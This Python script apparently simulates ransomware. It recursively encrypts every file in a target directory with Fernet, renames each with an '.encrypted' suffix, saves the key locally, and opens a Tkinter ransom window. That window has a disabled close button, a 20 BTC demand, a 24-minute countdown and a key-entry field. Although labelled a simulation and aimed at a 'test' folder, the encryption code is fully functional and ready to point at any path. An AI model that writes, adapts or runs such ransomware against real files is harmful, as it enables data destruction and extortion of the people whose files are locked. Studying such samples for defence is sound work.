import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
from cryptography.fernet import Fernet
import os
from decrypt import simulate_file_decryption

path = "test"

# Generate and store the encryption key in a file
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

with open("key.key", 'wb') as key_file:
    key_file.write(encryption_key)

def simulate_file_encryption(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            new_file_path = file_path + ".encrypted"

            # Read original content and encrypt it
            with open(file_path, 'rb') as f:
                content = f.read()
            encrypted_content = cipher.encrypt(content)

            # Rename file and write encrypted content
            os.rename(file_path, new_file_path)
            with open(new_file_path, 'wb') as f:
                f.write(encrypted_content)

def display_ransom_note():
    root = tk.Tk()
    root.title("Hacked!!!")

    # Disable window close button
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Load and resize the image
    image_path = "ransom_note.png"
    try:
        image = Image.open(image_path)
        image = image.resize((300, 300), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(image)
    except Exception as e:
        print(f"Failed to load image: {e}")
        return

    # Create a label to display the image
    image_label = tk.Label(root, image=photo)
    image_label.pack(pady=10)

    # Create a label to display the ransom note text
    text_label = tk.Label(root, text="Your files have been encrypted! Pay 20 BTC to decrypt your files.", padx=20, pady=20)
    text_label.pack()

    # Create a timer
    timer_label = tk.Label(root, text="Time left: 1440 seconds")
    timer_label.pack()

    time_left = 24 * 60
    decryption_successful = False

    def update_timer():
        nonlocal time_left, decryption_successful
        if not decryption_successful:
            if time_left > 0:
                time_left -= 1
                timer_label.config(text=f"Time left: {time_left} seconds")
                root.after(1000, update_timer)
            else:
                messagebox.showwarning("Time's up", "You ran out of time!")
                root.destroy()

    update_timer()

    # Create an entry field for the decryption key
    key_label = tk.Label(root, text="Enter decryption key:")
    key_label.pack(pady=5)
    key_entry = tk.Entry(root)
    key_entry.pack(pady=5)

    # Create a button to submit the decryption key
    def on_decrypt():
        nonlocal decryption_successful
        key = key_entry.get()
        decryption_successful = simulate_file_decryption(path, key)
        if decryption_successful:
            root.destroy()

    decrypt_button = tk.Button(root, text="Decrypt", command=on_decrypt)
    decrypt_button.pack(pady=10)

    # Keep a reference to the image to prevent garbage collection
    image_label.image = photo

    root.mainloop()

if __name__ == "__main__":
    # Encrypt files (for simulation purposes)
    simulate_file_encryption(path)  # Change the path as needed
    display_ransom_note()
